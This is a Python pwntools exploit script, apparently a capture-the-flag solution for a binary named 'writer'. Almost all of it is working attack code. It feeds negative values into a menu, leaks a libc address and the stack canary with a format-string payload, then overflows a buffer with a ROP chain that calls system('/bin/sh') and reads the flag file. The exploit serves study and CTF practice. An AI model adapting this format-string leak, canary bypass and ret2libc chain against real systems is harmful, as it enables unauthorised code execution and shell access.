from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./writer"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


money = 0x0004010
article_num = 0x404c
count = 0x4050

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"a" * 248
payload += p32(59)
payload += p32(23)

io.sendlineafter("> ", "1")
io.sendlineafter("> ", "1")

io.sendlineafter("> ", "2")
io.sendlineafter("> ", "-999999")
io.sendlineafter("> ", "2")
io.sendlineafter("> ", "-9999999999999")

# ddebug("breakrva 0x001742\n breakrva 0x000143B \n continue")
ddebug("breakrva 0x0161C\n continue")
io.sendlineafter("> ", "1")
io.sendlineafter("> ", payload)

# leak libc
io.sendlineafter("> ", "114514")
io.sendlineafter("> ", "--%61$p--%9$p--")
io.recvuntil("--", drop=True)
leak = io.recvuntil("--", drop=True)
libc.address = int(leak, 16) - 0x52d0
log.success("libc.address :-----> " + hex(libc.address))
leak = io.recvuntil("--", drop=True)
canary = int(leak, 16)
log.success("canary :-----> " + hex(canary))

# rop
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
environ = libc.symbols["__environ"]
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]

io.sendlineafter("> ", "114514")
payload = b"a" * (1048 - 16)
payload += p64(canary) + p64(0)
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(system_addr)

io.sendlineafter("> ", payload)

io.sendline(b"cat flag*")
io.interactive()
